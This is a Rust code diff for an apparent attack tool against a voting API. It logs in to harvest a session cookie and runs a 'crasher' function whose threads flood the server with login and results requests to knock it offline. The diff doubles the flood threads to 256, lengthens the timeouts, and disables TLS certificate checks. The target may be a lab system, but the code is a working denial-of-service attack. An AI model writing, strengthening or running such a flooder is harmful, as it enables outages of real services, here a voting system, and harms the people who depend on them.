@@ -22,7 +22,7 @@ async fn main() {
     let jar = reqwest_cookie_store::CookieStoreMutex::new(jar);
     let jar = std::sync::Arc::new(jar);
     //initialize client with said storage
-    let client = reqwest::Client::builder().cookie_provider(std::sync::Arc::clone(&jar)).build().unwrap();
+    let client = reqwest::Client::builder().cookie_provider(std::sync::Arc::clone(&jar)).danger_accept_invalid_certs(true).build().unwrap();
     //log in to server legitimatley
     client.post("https://voteapi/login").form(&[("ssn", "12345"),("password","1234")]).send().await.unwrap();
     //vote legitly to grab cookie
@@ -64,10 +64,10 @@ async fn main() {
 spawns threads to crash webserver by spamming login requests */
 fn crasher() {
     let mut crashers: Vec<JoinHandle<()>> = vec!();
-    for i in 0..128{
+    for i in 0..256{
     let a = thread::spawn(move || {
     loop{
-        let client = reqwest::blocking::Client::builder().timeout(Duration::from_millis(3000)).build().unwrap();
+        let client = reqwest::blocking::Client::builder().timeout(Duration::from_millis(10000)).danger_accept_invalid_certs(true).build().unwrap();
         match client.post("https://voteapi/login").form(&[("ssn", "1"),("password","jalskdjfh43u4halksdflkajsdlfkjasfy2323ADSFLSkasdfasd")]).send(){
             Ok(_) => (),
             Err(e) => {
@@ -79,7 +79,7 @@ fn crasher() {
     });
     let b = thread::spawn(move || {
         loop{
-            let client = reqwest::blocking::Client::builder().timeout(Duration::from_millis(3000)).build().unwrap();
+            let client = reqwest::blocking::Client::builder().timeout(Duration::from_millis(10000)).danger_accept_invalid_certs(true).build().unwrap();
             match client.get("https://voteapi/results").send(){
                 Ok(_) => (),
                 Err(e) => {
